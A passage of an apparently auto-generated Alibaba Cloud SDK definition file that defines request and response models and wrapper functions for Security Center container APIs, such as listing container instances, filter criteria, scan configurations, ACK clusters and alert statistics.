    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a containerized application.
 *
 * @param request DescribeContainerAppsRequest
 * @return DescribeContainerAppsResponse
 */
async function describeContainerApps(request: DescribeContainerAppsRequest): DescribeContainerAppsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerAppsWithOptions(request, runtime);
}

model DescribeContainerCriteriaRequest {
  groupField?: string(name='GroupField', description='The filter condition. Valid values:

*   **pod**: pod
*   **appName**: application name
*   **clusterId**: cluster ID
*   **namespace**: namespace
*   **image**: image
*   **containerScan**: container scan', example='clusterId'),
  value?: string(name='Value', description='The value of the filter condition. The value can be an application name, node name, namespace, cluster name, public IP address, pod address, region, pod, instance ID, cluster ID, or container ID. Fuzzy match is supported.', example='cfb41a869c71e4678a97021582dd8a****'),
}

model DescribeContainerCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **instanceId**: the ID of the container instance.
*   **clusterId**: the cluster ID.
*   **regionId**: the ID of the region in which the container resides.
*   **clusterName**: the name of the cluster.
*   **image**: the name of the image.
*   **imageRepoName**: the name of the image repository.
*   **imageRepoNamespace**: the namespace of the image repository.
*   **imageRepoTag**: the tag of the image repository.
*   **imageDigest**: the image digest.
*   **ClusterType**: the type of the cluster.
*   **hostIp**: the public IP address.
*   **pod**: the pod.
*   **podIp**: the IP address of the pod.
*   **containerId**: the container ID.
*   **vulStatus**: indicates whether vulnerabilities exist in the container.
*   **alarmStatus**: indicates whether alerts are generated for the container.
*   **riskStatus**: indicates whether risks exist in the container.
*   **riskLevel**: the risk level of the container.
*   **containerScope**: the type of the container.', example='clusterId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is set to **select**.

> If the value of **Type** is set to **input**, the return value of this parameter is empty.', example='ManagedKubernetes,NotManagedKubernetes,PrivateKubernetes'),
    }
  ](name='CriteriaList', description='An array that consists of information about the filter condition.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeContainerCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerCriteriaResponseBody(name='body'),
}

/**
 * @summary Obtains the filter conditions that you can use to filter the containers.
 *
 * @param request DescribeContainerCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerCriteriaResponse
 */
async function describeContainerCriteriaWithOptions(request: DescribeContainerCriteriaRequest, runtime: Util.RuntimeOptions): DescribeContainerCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the filter conditions that you can use to filter the containers.
 *
 * @param request DescribeContainerCriteriaRequest
 * @return DescribeContainerCriteriaResponse
 */
async function describeContainerCriteria(request: DescribeContainerCriteriaRequest): DescribeContainerCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerCriteriaWithOptions(request, runtime);
}

model DescribeContainerFieldStatisticsResponseBody = {
  containerGroupedFields?: {
    appCount?: int32(name='AppCount', description='The number of applications.', example='3'),
    clusterCount?: int32(name='ClusterCount', description='The number of clusters.', example='1'),
    containerCount?: int32(name='ContainerCount', description='The number of containers.', example='1'),
    imageCount?: int32(name='ImageCount', description='The number of images.', example='3'),
    instanceCount?: int32(name='InstanceCount', description='The number of instances.', example='1'),
    namespaceCount?: int32(name='NamespaceCount', description='The number of namespaces.', example='3'),
    podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
    riskAppCount?: int32(name='RiskAppCount', description='The number of the applications on which risks are detected.', example='1'),
    riskClusterCount?: int32(name='RiskClusterCount', description='The number of the clusters on which risks are detected.', example='1'),
    riskContainerCount?: int32(name='RiskContainerCount', description='The number of the containers on which risks are detected.', example='1'),
    riskImageCount?: int32(name='RiskImageCount', description='The number of the images on which risks are detected.', example='1'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of the instances on which risks are detected.', example='3'),
    riskPodCount?: int32(name='RiskPodCount', description='The number of the pods on which risks are detected.', example='2'),
  }(name='ContainerGroupedFields', description='The statistical information about containers.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model DescribeContainerFieldStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerFieldStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistical information about containers.
 *
 * @param request DescribeContainerFieldStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerFieldStatisticsResponse
 */
async function describeContainerFieldStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeContainerFieldStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeContainerFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistical information about containers.
 *
 * @return DescribeContainerFieldStatisticsResponse
 */
async function describeContainerFieldStatistics(): DescribeContainerFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerFieldStatisticsWithOptions(runtime);
}

model DescribeContainerGroupedFieldDetailRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to query assets. The value of this parameter is in the JSON format. Separate multiple search conditions with commas (,). Example: `[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]`.

>  Supported search conditions include the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.

This parameter is required.', example='[{\\\\"name\\\\":\\\\"clusterId\\\\",\\\\"value\\\\":\\\\"cfd26658431084c73a48dd97328ba8acf\\\\"}]'),
  groupField?: string(name='GroupField', description='The filter condition for a grouping and aggregation query. Valid values:

*   **pod**
*   **appName**
*   **clusterId**
*   **namespace**
*   **image**
*   **containerScan**

This parameter is required.', example='pod'),
}

model DescribeContainerGroupedFieldDetailResponseBody = {
  data?: {
    alarmCount?: int32(name='AlarmCount', description='The number of alerts.', example='1'),
    appName?: string(name='AppName', description='The name of the application.', example='node-local-dns'),
    clusterCurrentVersion?: string(name='ClusterCurrentVersion', description='The version of the current online server in the cluster.', example='1.14.8-aliyun.1'),
    clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='zhhtest'),
    clusterState?: string(name='ClusterState', description='The status of the cluster. Valid values:

*   STARTING: The cluster is being started.
*   START_FAILED: The cluster fails to be started.
*   BOOTSTRAPPING: The bootstrap action is being performed for the cluster.
*   RUNNING: The cluster is running.
*   TERMINATING: The cluster is being terminated.
*   TERMINATED: The cluster is terminated.
*   TERMINATED_WITH_ERRORS: The cluster is terminated due to an exception.
*   TERMINATE_FAILED: The cluster fails to be terminated.', example='RUNNING'),
    clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **Kubernetes**: dedicated Kubernetes cluster.
*   **ManagedKubernetes**: standard managed cluster (edge cluster).
*   **Ask**: serverless Kubernetes (ASK) cluster.', example='ManagedKubernetes'),
    containerCount?: int32(name='ContainerCount', description='The number of containers.', example='1'),
    createTime?: long(name='CreateTime', description='The creation time.', example='1702433618301'),
    instanceCount?: int32(name='InstanceCount', description='The number of instances.', example='1'),
    namespace?: string(name='Namespace', description='The namespace.', example='default'),
    nodeName?: string(name='NodeName', description='The name of the node.', example='shangliang-test'),
    pod?: string(name='Pod', description='The name of the pod.', example='node-local-dns-zwsxl'),
    podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
    podIp?: string(name='PodIp', description='The IP address of the pod.', example='192.168.1.1'),
    regionId?: string(name='RegionId', description='The ID of the region.', example='cn-shanghai'),
    vulCount?: int32(name='VulCount', description='The number of vulnerabilities.', example='1'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
}

model DescribeContainerGroupedFieldDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerGroupedFieldDetailResponseBody(name='body'),
}

/**
 * @summary Queries the attribute details of containers.
 *
 * @param request DescribeContainerGroupedFieldDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerGroupedFieldDetailResponse
 */
async function describeContainerGroupedFieldDetailWithOptions(request: DescribeContainerGroupedFieldDetailRequest, runtime: Util.RuntimeOptions): DescribeContainerGroupedFieldDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerGroupedFieldDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the attribute details of containers.
 *
 * @param request DescribeContainerGroupedFieldDetailRequest
 * @return DescribeContainerGroupedFieldDetailResponse
 */
async function describeContainerGroupedFieldDetail(request: DescribeContainerGroupedFieldDetailRequest): DescribeContainerGroupedFieldDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerGroupedFieldDetailWithOptions(request, runtime);
}

model DescribeContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to filter containers. The value of this parameter is in the JSON format and is case-sensitive. The value contains the following fields:

*   **name**: the search condition.

*   **name**: the value of the search condition.

*   **logicalExp**: the logical relationship among multiple search conditions. Valid values:

    *   **OR**: Search conditions are evaluated by using a logical **OR**.
    *   **AND**: Search conditions are evaluated by using a logical **AND**.

> You can use search conditions such as the container ID, cluster ID, cluster name, cluster type, risk level, and region. You can call the [DescribeContainerCriteria](~~DescribeContainerCriteria~~) operation to query the supported search conditions.', example='[{"name":"flag","value":"0|8","logicalExp":"AND"},{"name":"ecsType","value":"!8","logicalExp":"AND"}][{"name":"clusterType","value":"NotManagedKubernetes","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical operator that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='AND'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeContainerInstancesResponseBody = {
  containerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts.', example='1'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
      appName?: string(name='AppName', description='The name of the application.', example='alibaba-log-controller'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='cfb41a869c71e4678a97021582dd8a****'),
      clusterName?: string(name='ClusterName', description='The cluster name.', example='test'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d****'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1670368337000'),
      exposed?: int32(name='Exposed', description='Indicates whether the asset is exposed to the Internet.

*   **1**: exposed
*   **0**: not exposed', example='1'),
      exposedDetail?: string(name='ExposedDetail', description='The exposure details. The value is a JSON string.', example='[{}]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='1'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected. Valid values:

*   **NO**
*   **YES**', example='YES'),
      hostIp?: string(name='HostIp', description='The IP address of the host.', example='172.24.XX.XX'),
      image?: string(name='Image', description='The image of the container.', example='docker.io/library/nginx:latest'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageId?: string(name='ImageId', description='The image ID.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/log-controller@sha256:5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='log-controller'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace of the image repository.', example='acs'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image.', example='0.3.1.0-dfa2010-aliyun'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='5f23dfbceec289a49ac94e035e2****'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2zegzjyotydfkz9****'),
      namespace?: string(name='Namespace', description='The namespace.', example='kube-system'),
      nodeInfo?: string(name='NodeInfo', description='The node information.', example='test'),
      nodeName?: string(name='NodeName', description='The name of the node.', example='test'),
      pod?: string(name='Pod', description='The pod.', example='alibaba-log-controller-6f847f8786-mk2mg'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.24.XX.XX'),
      regionId?: string(name='RegionId', description='The region ID of the container.', example='cn-hangzhou'),
      riskCount?: string(name='RiskCount', description='The number of risks.', example='1'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**
*   **YES**', example='YES'),
      updateMark?: string(name='UpdateMark', description='The update identifier of the container.', example='79cff74d-e967-5407-8a78-ee03b9****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected in the container cluster.', example='15'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected in the container. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='ContainerInstanceList', description='The details of the container asset.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeContainerInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerInstancesResponseBody(name='body'),
}

/**
 * @summary Queries the information about containers.
 *
 * @param request DescribeContainerInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerInstancesResponse
 */
async function describeContainerInstancesWithOptions(request: DescribeContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about containers.
 *
 * @param request DescribeContainerInstancesRequest
 * @return DescribeContainerInstancesResponse
 */
async function describeContainerInstances(request: DescribeContainerInstancesRequest): DescribeContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerInstancesWithOptions(request, runtime);
}

model DescribeContainerScanConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeContainerScanConfigResponseBody = {
  data?: {
    allCount?: int32(name='AllCount', description='The total number of container applications in the cluster.', example='100'),
    appNames?: string(name='AppNames', description='The names of the container applications.', example='[\\\\"alicloud-monitor-controller\\\\"]'),
    chooseCount?: int32(name='ChooseCount', description='The number of selected container applications.', example='10'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='hhht-cluster-02'),
  }(name='Data', description='The response parameters.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='69BFFCDE-37D6-5A49-A8BC-BB03AC83****'),
}

model DescribeContainerScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerScanConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the vulnerability scan of one or more running container applications.
 *
 * @param request DescribeContainerScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerScanConfigResponse
 */
async function describeContainerScanConfigWithOptions(request: DescribeContainerScanConfigRequest, runtime: Util.RuntimeOptions): DescribeContainerScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the vulnerability scan of one or more running container applications.
 *
 * @param request DescribeContainerScanConfigRequest
 * @return DescribeContainerScanConfigResponse
 */
async function describeContainerScanConfig(request: DescribeContainerScanConfigRequest): DescribeContainerScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerScanConfigWithOptions(request, runtime);
}

model DescribeContainerServiceK8sClusterKritisStatusRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c0e9efc6dea5f41db93b7e977123c****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='119.145.XXX.XXX'),
}

model DescribeContainerServiceK8sClusterKritisStatusResponseBody = {
  kritisStatus?: {
    install?: boolean(name='Install', description='Indicates whether Kritis is installed. Valid values:

*   **true**
*   **false**', example='true'),
  }(name='KritisStatus', description='The Kritis status of the ACK cluster.'),
  requestId?: string(name='RequestId', description='The request ID.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
}

model DescribeContainerServiceK8sClusterKritisStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerServiceK8sClusterKritisStatusResponseBody(name='body'),
}

/**
 * @summary Queries the Kritis status of a Container Service for Kubernetes (ACK) cluster.
 *
 * @param request DescribeContainerServiceK8sClusterKritisStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerServiceK8sClusterKritisStatusResponse
 */
async function describeContainerServiceK8sClusterKritisStatusWithOptions(request: DescribeContainerServiceK8sClusterKritisStatusRequest, runtime: Util.RuntimeOptions): DescribeContainerServiceK8sClusterKritisStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerServiceK8sClusterKritisStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the Kritis status of a Container Service for Kubernetes (ACK) cluster.
 *
 * @param request DescribeContainerServiceK8sClusterKritisStatusRequest
 * @return DescribeContainerServiceK8sClusterKritisStatusResponse
 */
async function describeContainerServiceK8sClusterKritisStatus(request: DescribeContainerServiceK8sClusterKritisStatusRequest): DescribeContainerServiceK8sClusterKritisStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerServiceK8sClusterKritisStatusWithOptions(request, runtime);
}

model DescribeContainerServiceK8sClusterNamespacesRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID.', example='cf4435fefd45d4b1b8643f3a0bea3****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='140.205.XXX.XXX'),
}

model DescribeContainerServiceK8sClusterNamespacesResponseBody = {
  k8sClusterNamespaces?: [ 
    {
      namespace?: string(name='Namespace', description='The namespace.', example='default'),
    }
  ](name='K8sClusterNamespaces', description='The namespaces.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
}

model DescribeContainerServiceK8sClusterNamespacesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerServiceK8sClusterNamespacesResponseBody(name='body'),
}

/**
 * @summary Queries the namespace of a Container Service for Kubernetes (ACK) cluster.
 *
 * @param request DescribeContainerServiceK8sClusterNamespacesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerServiceK8sClusterNamespacesResponse
 */
async function describeContainerServiceK8sClusterNamespacesWithOptions(request: DescribeContainerServiceK8sClusterNamespacesRequest, runtime: Util.RuntimeOptions): DescribeContainerServiceK8sClusterNamespacesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerServiceK8sClusterNamespaces',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the namespace of a Container Service for Kubernetes (ACK) cluster.
 *
 * @param request DescribeContainerServiceK8sClusterNamespacesRequest
 * @return DescribeContainerServiceK8sClusterNamespacesResponse
 */
async function describeContainerServiceK8sClusterNamespaces(request: DescribeContainerServiceK8sClusterNamespacesRequest): DescribeContainerServiceK8sClusterNamespacesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerServiceK8sClusterNamespacesWithOptions(request, runtime);
}

model DescribeContainerServiceK8sClustersRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='42.120.XXX.XXX'),
}

model DescribeContainerServiceK8sClustersResponseBody = {
  k8sClusters?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='cdbbe7aa56cbf4b8f830f83718d26****'),
      name?: string(name='Name', description='The name of the cluster.', example='cluster-test'),
    }
  ](name='K8sClusters', description='The information about the clusters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model DescribeContainerServiceK8sClustersResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerServiceK8sClustersResponseBody(name='body'),
}

/**
 * @summary Queries a list of Container Service for Kubernetes (ACK) clusters.
 *
 * @param request DescribeContainerServiceK8sClustersRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerServiceK8sClustersResponse
 */
async function describeContainerServiceK8sClustersWithOptions(request: DescribeContainerServiceK8sClustersRequest, runtime: Util.RuntimeOptions): DescribeContainerServiceK8sClustersResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerServiceK8sClusters',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of Container Service for Kubernetes (ACK) clusters.
 *
 * @param request DescribeContainerServiceK8sClustersRequest
 * @return DescribeContainerServiceK8sClustersResponse
 */
async function describeContainerServiceK8sClusters(request: DescribeContainerServiceK8sClustersRequest): DescribeContainerServiceK8sClustersResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerServiceK8sClustersWithOptions(request, runtime);
}

model DescribeContainerStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the specified container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to obtain the cluster ID.

This parameter is required.', example='Cccfd68c474454665ace07efce924****'),
}

model DescribeContainerStatisticsResponseBody = {
  data?: {
    remindAlarmCount?: int32(name='RemindAlarmCount', description='The number of alerts whose risk level is **Reminder**.', example='1'),
    seriousAlarmCount?: int32(name='SeriousAlarmCount', description='The number of alerts whose risk level is **Urgent**.', example='2'),
    suspiciousAlarmCount?: int32(name='SuspiciousAlarmCount', description='The number of alerts whose risk level is **Suspicious**.', example='3'),
    totalAlarmCount?: int32(name='TotalAlarmCount', description='The total number of alerts that are generated in the current container cluster.', example='6'),
    totalNode?: int32(name='TotalNode', description='The total number of nodes in the current container cluster.', example='12'),
    hasRiskNode?: int32(name='hasRiskNode', description='The number of nodes on which alerts are generated in the current container cluster.', example='4'),
  }(name='Data', description='The alert statistics of container assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='21DA46CA-2DCE-4FF6-907D-D5DBBB7518C8'),
}

model DescribeContainerStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the alert statistics on container assets.
 *
 * @description Only users who created a Container Registry Enterprise Edition instance can call this operation.
 *
 * @param request DescribeContainerStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatisticsWithOptions(request: DescribeContainerStatisticsRequest, runtime: Util.RuntimeOptions): DescribeContainerStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
